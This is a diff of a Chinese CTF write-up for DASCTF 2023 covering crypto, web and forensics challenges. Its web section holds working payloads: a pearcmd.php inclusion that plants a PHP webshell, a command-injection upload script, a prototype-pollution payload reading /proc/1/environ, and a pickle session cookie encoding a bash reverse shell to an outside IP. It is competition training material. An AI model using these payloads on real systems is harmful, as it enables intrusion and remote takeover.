@@ -1,12 +1,12 @@
 # dasctf2023
 
 
-[https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ](https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ)
+参考：[2023DASCTF&0X401 WriteUp](https://mp.weixin.qq.com/s/4PdBJvd7mhzqjW1TEL6eyQ)
 
 ## Crypto
 ### ezDHKE
 DH秘钥交换算法
-```javascript
+```python
 from Crypto.Util.number import *
 from Crypto.Cipher import AES
 from hashlib import sha256
@@ -34,7 +34,7 @@ def getp():
 getp()
 ```
 用sympy爆破得到alice，接着直接算出key，aes解密
-```javascript
+```python
 from Crypto.Util.number import *
 from Crypto.Cipher import AES
 from hashlib import sha256
@@ -70,10 +70,13 @@ print("flag: ", flag)
 对第二，第三个等式在环q*r上求groebner基，得到m，M=m%q,然后小规模爆破还原M
 ## WEB
 ### ez_cms
-pearcmd.php包含 rce
-/admin，弱密码admin，123456
+pearcmd.php包含 rce  
+
+/admin，弱密码admin，123456  
+
 payload：
-```
+
+```bash
 /?+config-create+/&r=../../../../usr/share/php/pearcmd&/<?=eval($_GET[1]);?>+/tmp/hello.php
 
 /admin?r=../../../../../tmp/hello&1=system("ls");
@@ -83,15 +86,17 @@ payload：
 ![image-20230805012151280](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050121461.png)
 
 ### MyPicDisk
-反引号执行命令；base64编码绕过
+反引号执行命令；base64编码绕过  
+
 /y0u_cant_find_1t.zip，查看源码
 ![image-20230805012220243](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050122371.png)
-（为什么admin'能绕过
+username能用admin'绕过
 ![image-20230805012244806](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050122984.png)
-文件名用命令拼接，先上传再访问
+文件名用命令拼接，先上传再访问  
+
 payload：
 
-```javascript
+```python
 import base64
 import requests
 
@@ -118,9 +123,12 @@ res=requests.post(url+"?file="+payload, data=data, headers=headers)
 print(res.text)
 ```
 ### EzFlask
-python原型链污染 [https://tttang.com/archive/1876/](https://tttang.com/archive/1876/)
-过滤了__init__，Unicode编码绕过
+python原型链污染 [Python原型链污染变体(prototype-pollution-in-python)](https://tttang.com/archive/1876/)  
+
+过滤了__init__，Unicode编码绕过   
+
 payload：
+
 ```json
 {"username":"mof","password":"mof","\u0000\u005f\u0000\u005f\u0000\u0069\u0000\u006e\u0000\u0069\u0000\u0074\u0000\u005f\u0000\u005f":{"__globals__": {"__file__":"/proc/1/environ"}}}
 ```
@@ -128,10 +136,13 @@ payload：
 ![image-20230805012325897](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123022.png)
 
 ### ez_py
-sessioin pickle反序列化
-[https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py](https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py)
-settings.py
-```
+sessioin pickle反序列化  
+
+[https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py](https://boogipop.com/2023/07/22/DASCTF%202023%20&%200X401%20Web%20WriteUp/#ez-py)  
+
+settings.py 
+
+```python
 """
 Django settings for openlug project.
 
@@ -311,15 +322,17 @@ def exp(self):
         Command(), key=SECRET_KEY, salt=salt, serializer=PickleSerializer)
     return HttpResponse(out_cookie)
 ```
-```python
+```bash
 gASVYgAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlCiMNGJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTE5LjI5LjIwNy4yNy8zMDAwIDwmMSKUhZRK_____05OTk5OiYh0lFKULg:1qQe0Y:JrXwUfbqSYlYlhRUQ6XKt86TyL4
 ```
 在login时抓包，更改session，反弹shell（POST好像不行
 ![image-20230805012338403](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123479.png)
 
 ### ez_timing
-HTTP/2；timing
+HTTP/2；timing  
+
 [https://github.com/ConnorNelson/spaceless-spacing](https://github.com/ConnorNelson/spaceless-spacing)
+
 ```javascript
 -v 可以输出调试信息
 curl --http2-prior-knowledge 139.155.99.122:12003
@@ -332,13 +345,12 @@ curl --http2-prior-knowledge -X POST 139.155.99.122:12003/getkey （POST请求�
 flask-sessioin-cookie-manager3.py伪造cookie
 ![image-20230805012351360](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050123462.png)
 
-```javascript
-
+```bash
 curl --http2-prior-knowledge -H "Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.ZL6kNA.shduF_TuEL8rRpIZMugxe36Ovas;" 139.155
 .99.122:12003/file -v
 ```
 源码
-```javascript
+```bash
 #!/usr/bin/env python
 
 import time
@@ -397,9 +409,9 @@ def check_flag(secret):
 ### ezFAT32
 fs.img用010 editor打开
 ![image-20230805012405950](https://raw.githubusercontent.com/githubmof/Img/main/img/202308050124064.png)
-bmp文件头42 4D，把前面多余的和后面的00去掉，另存为.bmp
-[https://www.strerr.com/cn/sha256_file.html ](https://www.strerr.com/cn/sha256_file.html )
-算出sha256
-解压压缩包，拿到flag
-（注意把flag里的dasctf换成flag提交)
+bmp文件头42 4D，把前面多余的和后面的00去掉，另存为.bmp  
+
+[https://www.strerr.com/cn/sha256_file.html ](https://www.strerr.com/cn/sha256_file.html )  算出sha256  
+
+解压压缩包，拿到flag（注意把flag里的dasctf换成flag提交)
 
